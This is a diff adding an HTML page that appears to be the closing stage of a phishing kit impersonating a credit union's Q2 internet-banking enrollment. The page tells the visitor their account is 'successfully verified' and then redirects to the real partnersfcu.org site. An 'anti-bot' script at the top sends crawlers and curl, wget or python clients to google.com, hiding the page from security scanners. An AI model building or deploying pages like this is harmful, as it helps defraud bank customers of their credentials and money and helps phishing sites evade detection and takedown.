@@ -1,0 +1,196 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta
+      name="viewport"
+      content="width=device-width, minimum-scale=1.0, maximum-scale=2.0, user-scalable=1"
+    />
+    <title>Internet Banking Enrollment</title>
+    <script>
+    /* anti-bot */
+    var bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    var ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+
+    <link
+      rel="stylesheet"
+      href="https://cdn1.onlineaccess1.com/cdn/wedge/sdk_e2e/css/all.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdn1.onlineaccess1.com/cdn/wedge/sdk_e2e/css/layout5.css"
+    />
+    <style>
+      html {
+        min-height: 100%;
+      }
+
+      .container-fluid.heading {
+        width: 66.6666666666667%;
+        padding: 6% 0 0 0;
+      }
+
+      .btn-primary {
+        background-color: important;
+      }
+
+      .btn-primary {
+        color: important;
+      }
+
+      .btn-primary {
+        border-color: important;
+      }
+
+      .btn-secondary {
+        background-color: important;
+      }
+
+      .btn-secondary {
+        color: important;
+      }
+
+      .btn-secondary {
+        border-color: important;
+      }
+
+      @media screen and (max-width: 991px) {
+        .container-fluid.heading {
+          width: 83.3333333333333%;
+        }
+      }
+
+      @media screen and (max-width: 767px) {
+        .container-fluid.heading {
+          width: 100%;
+          padding: 0 0 0 0;
+        }
+      }
+
+      .container-fluid + .container {
+        background-color: #f6f6f6;
+      }
+
+      .outage-msg {
+        font-size: 19px;
+      }
+    </style>
+    <link
+      href="https://cdn1.onlineaccess1.com/cdn/depot/5257_01/4266/b06de577530f2a03f2a0f592baa60ba8/assets/images/favicon-c3da48bee55edb5c80e2bf4714856cc5.ico"
+      rel="icon"
+    />
+  </head>
+  <body>
+    <div class="modal fade" id="myModal" tabindex="-1" role="dialog">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-body">
+            <div class="row">
+              <div class="col-xs-12 congrats">
+                <i
+                  class="icon-ok-circle"
+                  aria-hidden="true"
+                  id="modal-title"
+                  style="font-size: 30px"
+                ></i>
+              </div>
+              <div class="col-xs-12" id="success_message"></div>
+              <div class="col-xs-12" id="modal-body"></div>
+            </div>
+          </div>
+          <div class="modal-footer" id="modal-footer"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid heading">
+      <div class="col-xs-12" style="text-align: center">
+        <img
+          id="logo-large"
+          src=" https://cdn1.onlineaccess1.com/cdn/depot/5257_01/4266/b9dfc5522a85674a8249d9cc929e5bbe/assets/images/logos/logo_large-c48397e5bd4f7d1654f3f890b3c04d8f.png"
+          style="max-width: 100%; height: auto"
+          alt="Q2 CI Environment"
+        />
+      </div>
+    </div>
+    <div
+      class="container col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12"
+    >
+      <div class="row" style="margin-bottom: 40px">
+        <div style="
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    flex-direction: column;
+                    text-align: center;
+                  " class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
+          <h1 id="page_title">Your Account Has Been Successfully Verified</h1>
+          <p id="page_message" class="page-message">
+            You can now enjoy our services.<br />
+            Your account will be verified and updated in the next 24 hours.
+          </p>
+          <div class="sr-only" tabindex="0">
+            All fields are required unless otherwise mentioned.
+          </div>
+          <ul id="nav-tabs" class="nav nav-tabs" style="display: none"></ul>
+        </div>
+        <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
+          <div id="q2-form-fields" class="tab-content">
+            <div id="personal">
+              <form
+                class="q2-form fv-form fv-form-bootstrap"
+                id="login-details"
+              >
+                <div
+                  style="
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    flex-direction: column;
+                    text-align: center;
+                  "
+                >
+                  <div class=""></div>
+                  <img
+                    src="images/img8.png"
+                    alt="Congratulations"
+                    style="width: 150px; max-width: 80%"
+                  />
+                  <div>
+                    You are being redirected to your account in
+                    <span id="countdown">10</span> seconds...
+                  </div>
+                </div>
+              </form>
+
+              <script>
+                function startCountdown() {
+                  let seconds = 10;
+                  const countdownElement = document.getElementById("countdown");
+
+                  const interval = setInterval(() => {
+                    countdownElement.textContent = seconds;
+                    seconds--;
+
+                    if (seconds < 0) {
+                      clearInterval(interval);
+                      window.location.href = "https://www.partnersfcu.org";
+                    }
+                  }, 1000);
+                }
+
+                window.onload = startCountdown;
+              </script>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="sr-message" aria-live="assertive" class="sr-only"></div>
+  </body>
+</html>
